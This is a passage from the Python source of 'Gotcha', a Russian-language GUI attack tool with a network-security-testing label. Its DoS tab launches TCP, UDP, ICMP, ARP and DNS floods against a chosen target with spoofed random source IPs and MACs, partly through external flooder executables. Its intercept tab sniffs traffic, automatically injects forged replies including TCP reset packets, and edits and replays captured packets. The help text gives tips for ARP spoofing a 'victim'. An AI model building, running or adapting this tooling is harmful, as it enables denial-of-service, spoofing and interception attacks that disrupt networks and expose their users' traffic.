        button_frame.pack(fill='x', padx=5, pady=10)
        self.custom_start_btn = ttk.Button(button_frame, text="Начать DoS атаку", 
                                         command=self.start_custom_attack, width=15)
        self.custom_start_btn.pack(side='left', padx=5)
        self.custom_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                        command=self.stop_custom_attack, width=15, state='disabled')
        self.custom_stop_btn.pack(side='left', padx=5)
        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Отправлено пакетов:", width=20, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.custom_sent = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_sent.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (pps):", width=20, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.custom_rate = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.custom_rate.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=20, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.custom_time = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.custom_time.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        log_frame = ttk.LabelFrame(right_frame, text="Лог DoS атаки")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.custom_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.custom_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", 
                  command=lambda: self.save_log(self.custom_log), width=14).pack()
        self.custom_attack_stats = {
            'start_time': 0,
            'sent_packets': 0,
            'received_packets': 0,
            'last_update': 0,
            'last_sent': 0,
            'total_bytes': 0
        }
        self.on_protocol_change()

    def on_protocol_change(self, event=None):
        proto = self.custom_protocol.get()
        if proto in ["TCP", "UDP"]:
            self.custom_port_frame.pack(fill='x', padx=5, pady=5, before=self.custom_options_frame
                                        if self.custom_options_frame.winfo_ismapped() else self.custom_row7)
        else:
            self.custom_port_frame.pack_forget()
        if proto in ["TCP", "ARP", "ICMP"]:
            self.custom_options_frame.pack(fill='x', padx=5, pady=5, before=self.custom_row7)
        else:
            self.custom_options_frame.pack_forget()

    def run_external_tool(self, args, log_widget, stop_event, process_key, infinite=False, on_finish=None, stats_callback=None):
        try:
            if platform.system() == "Windows":
                proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE if infinite else None,
                    text=True,
                    bufsize=1,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                proc = subprocess.Popen(
                    args,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    stdin=subprocess.PIPE if infinite else None,
                    text=True,
                    bufsize=1
                )
            self.external_processes[process_key] = (proc, stop_event)
            for line in iter(proc.stdout.readline, ''):
                line = line.strip()
                if not line:
                    continue
                try:
                    data = json.loads(line)
                    if data.get('type') == 'stats':
                        if stats_callback:
                            self.root.after(0, stats_callback, data)
                        elapsed = data.get('time', 0)
                        pps = data.get('pps', 0)
                        packets = data.get('packets', 0)
                        log_widget.insert('end', f"{elapsed}s: {pps} pps (total: {packets})\n")
                        log_widget.see('end')
                    else:
                        log_widget.insert('end', line + '\n')
                        log_widget.see('end')
                except json.JSONDecodeError:
                    log_widget.insert('end', line + '\n')
                    log_widget.see('end')
                if stop_event.is_set():
                    if infinite and proc.poll() is None:
                        try:
                            proc.stdin.write('\n')
                            proc.stdin.flush()
                        except:
                            pass
                    else:
                        proc.terminate()
                    break
            proc.wait()
        except Exception as e:
            log_widget.insert('end', f"External process error: {str(e)}\n")
        finally:
            self.external_processes.pop(process_key, None)
            log_widget.insert('end', "External process finished.\n")
            if on_finish:
                self.root.after(0, on_finish)

    def start_custom_attack(self):
        if self.custom_attack_running:
            return
        self.custom_attack_running = True
        self.custom_start_btn.config(state='disabled')
        self.custom_stop_btn.config(state='normal')
        try:
            target_ip = self.custom_ip.get()
            try:
                socket.inet_pton(socket.AF_INET6, target_ip)
                is_ipv6 = True
            except socket.error:
                is_ipv6 = False

            protocol = self.custom_protocol.get()
            port = int(self.custom_port.get()) if protocol in ["TCP", "UDP"] else 0
            packet_size = int(self.custom_packet_size.get())
            duration = int(self.custom_packet_count.get())
            continuous = duration == 0
            interface = self.custom_interface.get()
            random_ip = self.custom_random_ip.get()
            random_mac = self.custom_random_mac.get()
            if duration < 0:
                raise ValueError("Время атаки не может быть отрицательным")
            self.current_attack_type = protocol
            self.external_infinite = continuous and protocol in ["TCP", "ARP", "ICMP", "UDP"] and not is_ipv6
            self.custom_log.delete(1.0, tk.END)
            self.custom_log.insert('end', f"{protocol} flood started\n")
            self.custom_log.insert('end', f"Target: {target_ip}" + (f":{port}" if protocol in ["TCP","UDP"] else "") + "\n")
            self.custom_log.insert('end', f"Interface: {interface}\n")
            if protocol in ["TCP", "ARP", "ICMP", "UDP"] and not is_ipv6:
                self.custom_log.insert('end', f"Random IP: {'yes' if random_ip else 'no'}, Random MAC: {'yes' if random_mac else 'no'}\n")
            if protocol == "UDP":
                if is_ipv6:
                    self.raw_attack.start_udp_attack(
                        target_ip, port, packet_size, duration, 
                        continuous, interface, self._log_custom,
                        on_complete=lambda: self.root.after(0, self.on_internal_finished)
                    )
                else:
                    exe_path = find_exe("udp.exe")
                    if not exe_path:
                        self.custom_log.insert('end', "Error: udp.exe not found!\n")
                        self.stop_custom_attack()
                        return
                    try:
                        src_ip = get_if_addr(interface)
                        if not src_ip or src_ip == '0.0.0.0':
                            src_ip = "192.168.1.100"
                    except:
                        src_ip = "192.168.1.100"
                    threads = 4
                    args = [exe_path, src_ip, target_ip, str(port), str(threads), str(duration)]
                    if random_ip:
                        args.append("--random-ip")
                    if random_mac:
                        args.append("--random-mac")
                    self.custom_stop_event = threading.Event()
                    self.custom_external_thread = threading.Thread(
                        target=self.run_external_tool,
                        args=(args, self.custom_log, self.custom_stop_event, 'udp'),
                        kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                        daemon=True
                    )
                    self.custom_external_thread.start()
            elif protocol == "ICMP":
                if is_ipv6:
                    self.raw_attack.start_icmp_attack_ipv6(
                        target_ip, packet_size, duration, continuous, interface,
                        self._log_custom, on_complete=lambda: self.root.after(0, self.on_internal_finished)
                    )
                else:
                    exe_path = find_exe("icmp.exe")
                    if not exe_path:
                        self.custom_log.insert('end', "Error: icmp.exe not found!\n")
                        self.stop_custom_attack()
                        return
                    try:
                        src_ip = get_if_addr(interface)
                        if not src_ip or src_ip == '0.0.0.0':
                            src_ip = "192.168.1.100"
                    except:
                        src_ip = "192.168.1.100"
                    threads = 4
                    args = [exe_path, src_ip, target_ip, str(threads), str(duration)]
                    if random_ip:
                        args.append("--random-ip")
                    if random_mac:
                        args.append("--random-mac")
                    self.custom_stop_event = threading.Event()
                    self.custom_external_thread = threading.Thread(
                        target=self.run_external_tool,
                        args=(args, self.custom_log, self.custom_stop_event, 'icmp'),
                        kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                        daemon=True
                    )
                    self.custom_external_thread.start()
            elif protocol == "TCP":
                if is_ipv6:
                    self.raw_attack.start_tcp_attack_ipv6(
                        target_ip, port, packet_size, duration, continuous, interface,
                        self._log_custom, on_complete=lambda: self.root.after(0, self.on_internal_finished)
                    )
                else:
                    exe_path = find_exe("tcp.exe")
                    if not exe_path:
                        self.custom_log.insert('end', "Error: tcp.exe not found!\n")
                        self.stop_custom_attack()
                        return
                    try:
                        src_ip = get_if_addr(interface)
                        if not src_ip or src_ip == '0.0.0.0':
                            src_ip = "192.168.1.100"
                    except:
                        src_ip = "192.168.1.100"
                    threads = 4
                    args = [exe_path, src_ip, target_ip, str(port), str(threads), str(duration)]
                    if random_ip:
                        args.append("--random-ip")
                    if random_mac:
                        args.append("--random-mac")
                    self.custom_stop_event = threading.Event()
                    self.custom_external_thread = threading.Thread(
                        target=self.run_external_tool,
                        args=(args, self.custom_log, self.custom_stop_event, 'tcp'),
                        kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                        daemon=True
                    )
                    self.custom_external_thread.start()
            elif protocol == "ARP":
                if is_ipv6:
                    self.custom_log.insert('end', "Error: ARP не поддерживается для IPv6\n")
                    self.stop_custom_attack()
                    return
                exe_path = find_exe("arp.exe")
                if not exe_path:
                    self.custom_log.insert('end', "Error: arp.exe not found!\n")
                    self.stop_custom_attack()
                    return
                try:
                    src_ip = get_if_addr(interface)
                    if not src_ip or src_ip == '0.0.0.0':
                        src_ip = "192.168.1.100"
                except:
                    src_ip = "192.168.1.100"
                threads = 4
                args = [exe_path, src_ip, target_ip, str(threads), str(duration)]
                if random_ip:
                    args.append("--random-ip")
                if random_mac:
                    args.append("--random-mac")
                self.custom_stop_event = threading.Event()
                self.custom_external_thread = threading.Thread(
                    target=self.run_external_tool,
                    args=(args, self.custom_log, self.custom_stop_event, 'arp'),
                    kwargs={'infinite': self.external_infinite, 'on_finish': self.on_external_finished},
                    daemon=True
                )
                self.custom_external_thread.start()
            elif protocol == "DNS":
                self.scapy_attack.start_dns_attack(
                    target_ip, duration, continuous, interface, self._log_custom,
                    on_complete=lambda: self.root.after(0, self.on_internal_finished)
                )
            if protocol in ["UDP", "DNS"]:
                self.custom_attack_stats = {
                    'start_time': time.time(),
                    'sent_packets': 0,
                    'received_packets': 0,
                    'last_update': time.time(),
                    'last_sent': 0,
                    'total_bytes': 0
                }
                self.update_custom_attack_stats()
            elif (protocol in ["TCP", "ICMP"] and is_ipv6):
                self.custom_attack_stats = {
                    'start_time': time.time(),
                    'sent_packets': 0,
                    'received_packets': 0,
                    'last_update': time.time(),
                    'last_sent': 0,
                    'total_bytes': 0
                }
                self.update_custom_attack_stats()
            self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")
        except ValueError as e:
            messagebox.showerror("Ошибка", f"Некорректные параметры:\n{str(e)}")
            self.stop_custom_attack()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запустить атаку:\n{str(e)}")
            self.stop_custom_attack()

    def _log_custom(self, message):
        self.custom_log.insert('end', f"{message}\n")
        self.custom_log.see('end')

    def _show_internal_results(self, final_stats):
        if not final_stats:
            return
        total_packets = final_stats['total_sent']
        total_bytes = final_stats['total_bytes']
        total_time = time.time() - final_stats['start_time']
        self.custom_log.insert('end', "\n--- Results ---\n")
        self.custom_log.insert('end', f"Total packets sent: {total_packets}\n")
        self.custom_log.insert('end', f"Duration: {total_time*1000:.0f} ms\n")
        if total_time > 0:
            self.custom_log.insert('end', f"Avg rate: {int(total_packets/total_time)} pps\n")
        self.custom_log.insert('end', f"Total data: {total_bytes} bytes\n")
        if total_time > 0:
            self.custom_log.insert('end', f"Throughput: {(total_bytes*8/total_time/1e6):.2f} Mbps\n")

    def on_internal_finished(self):
        if not self.custom_attack_running or self.current_attack_type not in ["UDP", "DNS", "TCP", "ICMP"]:
            return
        final_stats = None
        if self.current_attack_type in ["UDP", "TCP", "ICMP"]:
            with self.raw_attack.stats_lock:
                final_stats = self.raw_attack.stats.copy()
        elif self.current_attack_type == "DNS":
            with self.scapy_attack.stats_lock:
                final_stats = self.scapy_attack.stats.copy()
        self._show_internal_results(final_stats)
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака завершена")
        self.current_attack_type = None
        self.external_infinite = False

    def on_external_finished(self):
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака завершена")

    def stop_custom_attack(self):
        if not self.custom_attack_running:
            return
        if self.current_attack_type in ["TCP", "ARP", "ICMP", "UDP"]:
            key = self.current_attack_type.lower()
            proc_info = self.external_processes.get(key)
            if proc_info:
                proc, stop_event = proc_info
                stop_event.set()
                if self.external_infinite and proc.poll() is None:
                    try:
                        proc.stdin.write('\n')
                        proc.stdin.flush()
                    except:
                        pass
                if proc.poll() is None:
                    try:
                        proc.wait(timeout=1)
                    except subprocess.TimeoutExpired:
                        proc.kill()
        if self.current_attack_type in ["UDP", "DNS", "TCP", "ICMP"]:
            if self.raw_attack.running:
                final_stats = self.raw_attack.stop()
            elif self.scapy_attack.running:
                final_stats = self.scapy_attack.stop()
            else:
                final_stats = None
            self._show_internal_results(final_stats)
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')
        self.status_var.set("DoS атака остановлена")
        self.current_attack_type = None
        self.external_infinite = False

    def update_custom_attack_stats(self):
        if not self.custom_attack_running:
            return
        current_time = time.time()
        if self.raw_attack.running:
            with self.raw_attack.stats_lock:
                sent_packets = self.raw_attack.stats['total_sent']
                rate = self.raw_attack.stats['current_pps']
                self.custom_rate.config(text=f"{rate}")
        elif self.scapy_attack.running:
            with self.scapy_attack.stats_lock:
                sent_packets = self.scapy_attack.stats['total_sent']
        else:
            sent_packets = 0
        self.custom_sent.config(text=f"{sent_packets}")
        duration = current_time - self.custom_attack_stats['start_time']
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.custom_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.custom_attack_running:
            self.root.after(1000, self.update_custom_attack_stats)

    # -------------------- Intercept tab (unchanged) --------------------
    def setup_intercept_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='y', padx=5, pady=5)
        params_frame = ttk.LabelFrame(left_frame, text="Параметры перехвата")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=4, pady=3)
        ttk.Label(row1, text="Интерфейс:").pack(side='left', padx=2)
        self.intercept_interface = ttk.Combobox(row1, width=15, font=('Arial', 9), values=self.network_interfaces)
        self.intercept_interface.pack(side='left', padx=2)
        self.intercept_interface.set(self.active_interface)
        ttk.Label(row1, text="Фильтр:").pack(side='left', padx=8)
        self.intercept_filter = ttk.Combobox(row1, width=18, font=('Arial', 9), values=[
            "icmp or tcp", "tcp", "udp", "icmp", "arp", "not arp", "not stp", 
            "port 80", "port 443", "host 192.168.1.1", "tcp port 80", "udp port 53"
        ])
        self.intercept_filter.pack(side='left', padx=2)
        self.intercept_filter.set("")
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=4, pady=3)
        ttk.Label(row2, text="Кол-во ответов:").pack(side='left', padx=2)
        self.intercept_response_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.intercept_response_count.pack(side='left', padx=2)
        self.intercept_response_count.insert(0, "0")
        ttk.Label(row2, text="Кол-во для отпр.:").pack(side='left', padx=10)
        self.send_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.send_count.pack(side='left', padx=2)
        self.send_count.insert(0, "10")
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=4, pady=6)
        self.intercept_start_btn = ttk.Button(button_frame, text="Начать перехват", 
                                        command=self.start_packet_intercept, width=14)
        self.intercept_start_btn.pack(side='left', padx=2)
        self.intercept_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                       command=self.stop_packet_intercept, width=12, state='disabled')
        self.intercept_stop_btn.pack(side='left', padx=2)
        ttk.Button(button_frame, text="Захватить выбранный", 
              command=self.capture_selected_intercept_packet, width=18).pack(side='left', padx=2)
        ttk.Button(button_frame, text="Редактировать", 
              command=self.edit_selected_intercept_packet, width=13).pack(side='left', padx=1)
        packets_frame = ttk.LabelFrame(left_frame, text="Перехваченные пакеты")
        packets_frame.pack(fill='both', expand=True, padx=5, pady=5)
        columns = ("№", "Время", "Источник", "Назначение", "Протокол", "Длина", "Информация")
        self.intercept_tree = ttk.Treeview(packets_frame, columns=columns, show='headings', height=12)
        for col in columns:
            self.intercept_tree.heading(col, text=col)
            self.intercept_tree.column(col, width=90)
        self.intercept_tree.column("№", width=40)
        self.intercept_tree.column("Время", width=80)
        self.intercept_tree.column("Источник", width=120)
        self.intercept_tree.column("Назначение", width=120)
        self.intercept_tree.column("Протокол", width=70)
        self.intercept_tree.column("Длина", width=50)
        self.intercept_tree.column("Информация", width=150)
        tree_scroll = ttk.Scrollbar(packets_frame, orient="vertical", command=self.intercept_tree.yview)
        self.intercept_tree.configure(yscrollcommand=tree_scroll.set)
        self.intercept_tree.pack(side='left', fill='both', expand=True)
        tree_scroll.pack(side='right', fill='y')
        control_frame = ttk.LabelFrame(right_frame, text="Управление пакетами")
        control_frame.pack(fill='x', padx=5, pady=5)
        info_frame = ttk.LabelFrame(control_frame, text="Текущие пакеты")
        info_frame.pack(fill='x', padx=5, pady=5)
        ttk.Label(info_frame, text="Захваченный:").pack(anchor='w', pady=1)
        self.captured_packet_info = ttk.Label(info_frame, text="Нет", wraplength=300)
        self.captured_packet_info.pack(anchor='w', pady=1, fill='x')
        ttk.Label(info_frame, text="Отредактированный:").pack(anchor='w', pady=1)
        self.edited_packet_info = ttk.Label(info_frame, text="Нет", wraplength=300)
        self.edited_packet_info.pack(anchor='w', pady=1, fill='x')
        send_frame = ttk.Frame(control_frame)
        send_frame.pack(fill='x', padx=5, pady=8)
        ttk.Button(send_frame, text="Отправить захваченный", 
              command=self.send_captured_packet, width=20).pack(pady=2)
        ttk.Button(send_frame, text="Отправить отредактированный", 
              command=self.send_edited_packet, width=20).pack(pady=2)
        ttk.Button(control_frame, text="Очистить список", 
              command=self.clear_intercept_list, width=20).pack(pady=5)
        log_frame = ttk.LabelFrame(right_frame, text="Лог перехвата")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.intercept_log = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD, font=('Consolas', 8))
        self.intercept_log.pack(fill='both', expand=True, padx=5, pady=5)
        ttk.Button(log_frame, text="Сохранить лог", 
              command=lambda: self.save_log(self.intercept_log), width=14).pack(pady=4)
        self.intercept_tree.bind('<<TreeviewSelect>>', self.on_intercept_packet_select)

    def on_intercept_packet_select(self, event):
        selection = self.intercept_tree.selection()
        if not selection:
            return
        item = selection[0]
        packet_info = self.intercept_tree.item(item, 'values')
        index = int(packet_info[0]) - 1
        if 0 <= index < len(self.intercept_packets):
            self.selected_packet = self.intercept_packets[index]
            self.intercept_log.insert('end', f"\n--- ВЫБРАН #{packet_info[0]} ---\n")
            self.intercept_log.insert('end', f"Время: {packet_info[1]}\n")
            self.intercept_log.insert('end', f"Источник: {packet_info[2]}\n")
            self.intercept_log.insert('end', f"Назначение: {packet_info[3]}\n")
            self.intercept_log.insert('end', f"Протокол: {packet_info[4]}\n")
            self.intercept_log.insert('end', f"Длина: {packet_info[5]} байт\n")
            self.intercept_log.insert('end', f"Информация: {packet_info[6]}\n")
            self.intercept_log.see('end')

    def capture_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет")
            return
        self.captured_packet = self.selected_packet
        self.captured_packet_info.config(text=f"Захвачен: {self.selected_packet.summary()}")
        self.intercept_log.insert('end', f"\nПакет захвачен: {self.selected_packet.summary()}\n")

    def edit_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет")
            return
        def callback(edited_packet, save_packet):
            if save_packet:
                self.edited_packet = edited_packet
                self.edited_packet_info.config(text=f"Отредактирован: {edited_packet.summary()}")
                self.intercept_log.insert('end', f"\nПакет сохранён: {edited_packet.summary()}\n")
        Editor(self.root, self.selected_packet, callback)

    def send_captured_packet(self):
        if self.captured_packet is None:
            self.intercept_log.insert('end', "Нет захваченного пакета для отправки!\n")
            return
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            for i in range(count):
                sendp(self.captured_packet, iface=interface, verbose=0)
            self.intercept_log.insert('end', f"Отправлено {count} копий захваченного пакета\n")
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки: {str(e)}\n")

    def send_edited_packet(self):
        if self.edited_packet is None:
            self.intercept_log.insert('end', "Нет отредактированного пакета для отправки!\n")
            return
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            for i in range(count):
                sendp(self.edited_packet, iface=interface, verbose=0)
            self.intercept_log.insert('end', f"Отправлено {count} копий отредактированного пакета\n")
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки: {str(e)}\n")

    def clear_intercept_list(self):
        for item in self.intercept_tree.get_children():
            self.intercept_tree.delete(item)
        self.intercept_packets.clear()
        self.intercept_log.insert('end', "Список пакетов очищен\n")

    def add_packet_to_intercept_tree(self, packet_data):
        packet_num, current_time, src, dst, protocol, length, info, packet = packet_data
        self.intercept_packets.append(packet)
        self.intercept_tree.insert("", "end", values=(packet_num, current_time, src, dst, protocol, length, info))
        if len(self.intercept_tree.get_children()) > 1000:
            self.intercept_tree.delete(self.intercept_tree.get_children()[0])
            self.intercept_packets.pop(0)

    def start_packet_intercept(self):
        self.packet_intercept_running = True
        self.intercept_start_btn.config(state='disabled')
        self.intercept_stop_btn.config(state='normal')
        self.intercept_thread = threading.Thread(
            target=self.intercept_worker,
            args=(self.intercept_filter.get(), self.intercept_interface.get())
        )
        self.intercept_thread.daemon = True
        self.intercept_thread.start()
        self.intercept_log.insert('end', "Перехват пакетов запущен\n")
        self.status_var.set("Перехват запущен")

    def stop_packet_intercept(self):
        self.packet_intercept_running = False
        self.intercept_start_btn.config(state='normal')
        self.intercept_stop_btn.config(state='disabled')
        self.intercept_log.insert('end', "Перехват остановлен\n")
        self.status_var.set("Перехват остановлен")

    def get_packet_info(self, packet):
        src = "Unknown"
        dst = "Unknown"
        protocol = "Unknown"
        length = len(packet)
        info = ""
        if packet.haslayer(Ether):
            src = packet[Ether].src
            dst = packet[Ether].dst
        if packet.haslayer(IPv6):
            src = packet[IPv6].src
            dst = packet[IPv6].dst
            protocol = "IPv6"
            if packet.haslayer(TCP):
                protocol = "TCP"
                info = f"Ports: {packet[TCP].sport}->{packet[TCP].dport} Flags: {packet[TCP].flags}"
            elif packet.haslayer(UDP):
                protocol = "UDP" 
                info = f"Ports: {packet[UDP].sport}->{packet[UDP].dport}"
            elif packet.haslayer(ICMP):
                protocol = "ICMP"
                info = f"Type: {packet[ICMP].type} Code: {packet[ICMP].code}"
        elif packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            protocol = "IP"
            if packet.haslayer(TCP):
                protocol = "TCP"
                info = f"Ports: {packet[TCP].sport}->{packet[TCP].dport} Flags: {packet[TCP].flags}"
            elif packet.haslayer(UDP):
                protocol = "UDP" 
                info = f"Ports: {packet[UDP].sport}->{packet[UDP].dport}"
            elif packet.haslayer(ICMP):
                protocol = "ICMP"
                info = f"Type: {packet[ICMP].type} Code: {packet[ICMP].code}"
        elif packet.haslayer(ARP):
            protocol = "ARP"
            info = f"Operation: {packet[ARP].op}"
        return (src, dst, protocol, length, info)

    def intercept_worker(self, filter_str, interface):
        def intercept_handler(packet):
            if not self.packet_intercept_running:
                return
            timestamp = time.strftime("%H:%M:%S")
            self.intercept_log.insert('end', f"[{timestamp}] Перехвачен: {packet.summary()}\n")
            src, dst, proto, length, info = self.get_packet_info(packet)
            num = len(self.intercept_tree.get_children()) + 1
            data = (num, timestamp, src, dst, proto, length, info, packet)
            self.root.after(0, self.add_packet_to_intercept_tree, data)
            try:
                resp_count = int(self.intercept_response_count.get())
            except:
                resp_count = 4
            for i in range(resp_count):
                resp = self.create_response_packet(packet)
                if resp:
                    try:
                        sendp(resp, iface=interface, verbose=0)
                        self.intercept_log.insert('end', f"  -> Ответ {i+1} отправлен\n")
                    except Exception as e:
                        self.intercept_log.insert('end', f"  -> Ошибка ответа: {str(e)}\n")
        try:
            sniff(filter=filter_str, iface=interface, prn=intercept_handler,
                  stop_filter=lambda x: not self.packet_intercept_running)
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка сниффинга: {str(e)}\n")

    def create_response_packet(self, original_packet):
        try:
            if original_packet.haslayer(ICMP) and original_packet[ICMP].type == 8:
                if original_packet.haslayer(IPv6):
                    return IPv6(src=original_packet[IPv6].dst, dst=original_packet[IPv6].src)/ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq)
                else:
                    return IP(src=original_packet[IP].dst, dst=original_packet[IP].src)/ICMP(type=0, id=original_packet[ICMP].id, seq=original_packet[ICMP].seq)
            elif original_packet.haslayer(TCP):
                if original_packet.haslayer(IPv6):
                    ip_layer = IPv6(src=original_packet[IPv6].dst, dst=original_packet[IPv6].src)
                else:
                    ip_layer = IP(src=original_packet[IP].dst, dst=original_packet[IP].src)
                return ip_layer/TCP(
                    sport=original_packet[TCP].dport, 
                    dport=original_packet[TCP].sport,
                    flags="RA",
                    seq=random.randint(1000, 9000),
                    ack=original_packet[TCP].seq + 1
                )
            elif original_packet.haslayer(UDP):
                if original_packet.haslayer(IPv6):
                    ip_layer = IPv6(src=original_packet[IPv6].dst, dst=original_packet[IPv6].src)
                else:
                    ip_layer = IP(src=original_packet[IP].dst, dst=original_packet[IP].src)
                return ip_layer/UDP(
                    sport=original_packet[UDP].dport,
                    dport=original_packet[UDP].sport
                )/b"Response"
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка создания ответа: {str(e)}\n")
        return None

    # -------------------- Settings tab (unchanged) --------------------
    def setup_settings_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        theme_frame = ttk.LabelFrame(main_frame, text="Настройки темы")
        theme_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(theme_frame, text="Светлая тема", 
                  command=lambda: self.theme_manager.apply_theme("light"), width=12).pack(side='left', padx=4, pady=4)
        ttk.Button(theme_frame, text="Тёмная тема", 
                  command=lambda: self.theme_manager.apply_theme("dark"), width=12).pack(side='left', padx=4, pady=4)
        help_frame = ttk.LabelFrame(main_frame, text="Справка")
        help_frame.pack(fill='both', expand=True, padx=5, pady=5)
        ttk.Button(help_frame, text="Открыть справку", command=self.show_help, width=22).pack(padx=8, pady=8)

    def save_log(self, text_widget):
        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text_widget.get(1.0, tk.END))
                self.status_var.set("Лог сохранён")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл: {str(e)}")

    def show_help(self):
        help_window = tk.Toplevel(self.root)
        help_window.title("Справка")
        help_window.geometry("800x700")
        help_window.transient(self.root)
        help_window.grab_set()
        try:
            help_window.iconbitmap("other/images.ico")
        except:
            pass
        help_notebook = ttk.Notebook(help_window)
        help_notebook.pack(fill='both', expand=True, padx=15, pady=15)
        general_frame = ttk.Frame(help_notebook)
        help_notebook.add(general_frame, text="Общая информация")
        general_text = """Gotcha – Инструмент для тестирования сетевой безопасности
https://github.com/hedromanie
ТРЕБОВАНИЯ:
• Права администратора
• Windows 10 21h2+ или Linux (с адаптацией)
• Установленный Npcap
• Wireshark рекомендуется для мониторинга
• Для поиска уязвимостей рекомендуется Nmap / Zenmap GUI
• Советую также для обучения Metasploit Framework или Kali Linux / BlackArch


Если у вас не работает ARP spoofing / Происходит конфликт ip-адрессов / Жертва не может достучаться до шлюза
Откройте Powershell и впишите данные команды

Get-Service RemoteAccess
Set-Service RemoteAccess -StartupType Automatic
Start-Service RemoteAccess
"""
        general_txt = scrolledtext.ScrolledText(general_frame, wrap=tk.WORD, font=('Arial', 10))
        general_txt.pack(fill='both', expand=True, padx=10, pady=10)
        general_txt.insert('1.0', general_text)
        general_txt.config(state='disabled')
        bpf_frame = ttk.Frame(help_notebook)
        help_notebook.add(bpf_frame, text="BPF фильтры")
        bpf_text = """ПРИМЕРЫ BPF ФИЛЬТРОВ:
ОСНОВНЫЕ ПРИМИТИВЫ:
   host <ip>          – трафик с/на IP (host 192.168.1.1)
   net <сеть>         – трафик в сети (net 192.168.1.0/24)
   port <число>       – трафик на порт (port 80)
   portrange <min-max>– диапазон портов (portrange 1-1024)
   ether host <mac>   – кадры с указанным MAC
   ether broadcast    – широковещательные кадры
   ip, ip6, arp, tcp, udp, icmp – протоколы
НАПРАВЛЕНИЕ:
   src <примитив>     – только от источника
   dst <примитив>     – только к назначению
ЛОГИЧЕСКИЕ ОПЕРАТОРЫ:
   and, && – И
   or, ||  – ИЛИ
   not, !  – НЕ
ПРИМЕРЫ (с пояснениями):
   1. tcp port 80 – только TCP-пакеты с портом 80 (HTTP)
   2. udp port 53 – только DNS-запросы/ответы
   3. icmp – только ICMP (ping, ошибки)
   4. arp – только ARP-пакеты
   5. not arp and not stp and not cdp – исключает служебные протоколы (оставляет IP-трафик)
   6. host 192.168.1.100 and tcp port 22 – SSH-трафик с/на конкретный хост
   7. src net 192.168.1.0/24 – пакеты из сети 192.168.1.0/24
   8. tcp and (port 80 or port 443) – HTTP или HTTPS
   9. icmp or arp – диагностические протоколы
   10. not port 22 and not port 23 – исключает SSH и Telnet
   11. ether host 01:23:45:67:89:ab – кадры с заданным MAC
   12. vlan – все пакеты с тегом VLAN (можно уточнить vlan 100)
   13. greater 500 – пакеты длиннее 500 байт
